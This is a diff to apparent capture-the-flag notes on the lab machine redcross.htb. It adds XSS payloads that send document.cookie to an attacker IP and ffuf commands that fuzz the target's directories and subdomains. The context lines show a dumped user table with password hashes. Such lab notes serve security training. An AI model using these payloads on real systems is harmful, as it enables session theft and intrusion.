@@ -46,3 +46,16 @@
 			| 4  | tricia.wanderloo@contoso.com | 100  | $2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r. | tricia   |
 			| 5  | non@available                | 1000 | $2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi | guest    |
 			+----+------------------------------+------+--------------------------------------------------------------+----------+
+
+
+
+Commands :
+
+<script>alert(1)</script>
+<script>document.location='http://10.10.16.6:8444?c='+document.cookie</script>
+
+<script>var myimg = new Image(); myimg.src = 'http://10.10.16.6/q?=' + document.cookie;</script>
+
+
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u https://intra.redcross.htb/FUZZ -c -v -fc 404,400,301
+ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u https://redcross.htb -H "Host: FUZZ.redcross.htb"
